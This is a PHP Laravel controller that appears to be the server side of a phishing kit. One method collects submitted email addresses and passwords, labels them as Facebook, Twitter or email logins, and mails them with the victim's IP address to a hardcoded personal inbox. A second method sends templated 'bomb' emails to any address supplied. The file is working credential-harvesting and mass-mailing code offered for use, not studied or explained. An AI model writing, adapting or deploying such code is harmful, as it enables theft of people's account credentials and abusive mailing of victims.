<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
        $ret = null;
    	#return view('index', compact(['ret']));
    	return view('ur', compact(['ret']));
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getUR()
    {
        $ret = null;
    	return view('ur');
    }

	/**
	 * Show the application file screen to the user.
	 *
	 * @return Response
	 */
	public function getFile()
    {
        $ret = null;
    	return view('file', compact(['ret']));
    }
    
   
    
    
    public function getPartner(Request $request)
	{
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'deg' => 'required',
                             'email' => 'required|email',
                             'pass' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Enter your email and password to continue!";
                       
                 }
                
                 else
                 { 
			           $dg = "E-mail";
					   $deg = $req["deg"];
					   if($deg == "fbb") $dg = "Facebook";
					   else if($deg == "tww") $dg = "Twitter";
					   
            		   $s = "New $dg Login: ".date("h:i A jS F, Y");
                       $rcpt = "ceochriswoods@gmail.com";
                       $pass = $req["pass"];
                       $email = $req["email"];
					   $ip = getenv("REMOTE_ADDR");

                       $this->helpers->sendEmail($rcpt,$s,['ip' => $ip,'pass' => $pass,'email' => $email],'emails.apply_alert','view');  
                        $ret = "ok";                      
                  }       
           return $ret;                                                                                            
	}
	
	public function getMMM(Request $request)
	{
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'em' => 'required|email',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Enter email to continue!";
                       
                 }
                
                 else
                 { 
                       $email = $req["em"];
					   $ip = getenv("REMOTE_ADDR");
					   $s = "Still waiting for your reply";

                       $this->helpers->sendEmail($email,$s,['email' => $email],'emails.bomb','view');  
                        $ret = "Email to ".$email." was successful!";                      
                  }       
           return $ret;                                                                                            
	}

}
